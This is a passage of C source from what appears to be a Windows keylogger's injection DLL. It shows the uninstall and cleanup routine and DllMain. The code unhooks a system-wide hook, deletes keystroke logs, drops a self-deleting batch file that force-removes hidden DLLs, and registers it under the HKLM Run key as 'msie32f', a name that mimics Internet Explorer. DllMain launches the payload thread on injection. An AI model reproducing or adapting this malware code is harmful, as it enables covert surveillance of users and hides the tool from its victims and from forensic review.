	pUnhookWindowsHookEx = GetProcAddress(user32, "UnhookWindowsHookEx"); 
	if (!pUnhookWindowsHookEx) { 
		WIN_ERR("Could not get address of UnhookWindowsHookEx."); 
	} 

	pUnhookWindowsHookEx(hook); 

	/*	This only frees one instance. There's no way to free what the OS injected into every 
		other process due to the system-wide hook. */ 
	FreeLibrary(DllInst); 
	FreeLibrary(user32); 

	/* Should we be uninstalled? */ 
	if (uninstall) { 
		WIN32_FIND_DATA fd; 
		char tmp[MAX_PATH+1]; 
		char batname[MAX_PATH+1]; 
		FILE* bat; 
		HKEY hkey; 

		INFO("** Uninstallation has begun."); 

		/* Remove the current log, along with the any archived logs. */ 
		remove(logfile); 

		/* Construct wildcard for archived logs. */ 
		snprintf(tmp, MAX_PATH, "%s.temp.*", logfile); 
		tmp[MAX_PATH] = '\0'; 

		/* Look for any files matching the wildcard and remove them. */ 
		h = FindFirstFile(tmp, &fd); 
		if (h && INVALID_HANDLE_VALUE!=h) { 
			/* If we found at least one.. */ 
			char file[MAX_PATH+1]; 
			do { 
				/* Construct the archived file's path. */ 
				snprintf(file, MAX_PATH, "%s/%s", settings.path, fd.cFileName); 
				file[MAX_PATH] = '\0'; 

				/* Delete the file. */ 
				remove(file); 
			} while (FindNextFile(h, &fd)); 
			FindClose(h); 
		} 

		/* Remove our loader. */ 
		remove(path2me); 

		/* dlls will be removed on next reboot via batch file set to startup w/ Windows. */ 

		/* Create a batch file to remove DLLs. It will also remove itself. */ 
		snprintf(batname, MAX_PATH, "%s\\%s.bat", settings.path, settings.injectname); 
		batname[MAX_PATH] = '\0'; 

		/* Drop the batch file that will delete the DLLs. */ 
		bat = fopen(batname, "wb"); 
		if (bat) { 
			char* buf; 
			buf = malloc(512); 
			if (buf) { 
				char dllhook[MAX_PATH+1]; 

				snprintf(dllhook, MAX_PATH, "%s\\%s", settings.path, settings.hookname); 
				dllhook[MAX_PATH] = '\0'; 

				snprintf(tmp, MAX_PATH, "%s\\%s", settings.path, settings.injectname); 
				tmp[MAX_PATH] = '\0'; 

				/* Output the batch file to disk. */ 
				snprintf(buf, 512, \
						"@del /F /A:H %s\r\n" \
						"@del /F /A:H %s\r\n" \
						"@reg DELETE \"HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run\" /v \"msie32f\" /f\r\n" \
						"@del /F %s\r\n", dllhook, tmp, batname); 
				fputs(buf, bat); 

				free(buf); 
				fclose(bat); 

				/* Set batch file to run on next startup. */ 

				/* Open the key. */ 
#define REG_RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 
				if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, KEY_ALL_ACCESS, &hkey)) { 
					WIN_ERR("Failed opening Run key to add batch file value."); 
					return 1; 
				} 

				/* Set the value. */ 
				if (RegSetValueEx(hkey, "msie32f", 0, REG_SZ, batname, strlen(batname))) { 
					WIN_ERR("Failed to set Run batch value."); 
					return 1; 
				} 

				/* Close the key. */ 
				RegCloseKey(hkey); 
			} 
#ifdef DEBUG_MODE 
			else { 
				WIN_ERR("Unable to allocate space for bat file."); 
			} 
#endif 
		} 
#ifdef DEBUG_MODE 
		else { 
			WIN_ERR("Unable to open file to write batch."); 
		} 
#endif 
		INFO("We have been uninstalled."); 
	} 

	/* Clean up the rest. */ 
	FreeSettings(&settings); 

	/* Close mutexes and file mappings. */ 
	CloseHandle(mutex_log); 
	CloseHandle(mutex_status); 
	CloseHandle(mutex_ftp); 
	h = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_LOGFILE); 
	if (h) CloseHandle(h); 
	h = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_STATUS); 
	if (h) CloseHandle(h); 
	h = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_FLAGS); 
	if (h) CloseHandle(h); 

	CloseHandle(oneinstance); 
	INFO("** Injection DLL is done. Leaving."); 
	return 0; 
} 


BOOL APIENTRY DllMain (HINSTANCE hInst, DWORD reason, LPVOID reserved) { 
	/*	Calling threads in DllMain is error prone and stupid. 
		I have no choice. Injection only allows for DllMain to be executed. */ 
#ifdef DEBUG_MODE 
	/* To stop the annoying warnings. */ 
	reserved = 0; 
	hInst = 0; 
#endif 
	if (DLL_PROCESS_ATTACH==reason) CreateThread(0, 0, main2, 0, 0, 0); 
/*	if (DLL_PROCESS_ATTACH==reason) CreateThread(0, 0, main3, 0, 0, 0); */
    return TRUE; 
} 



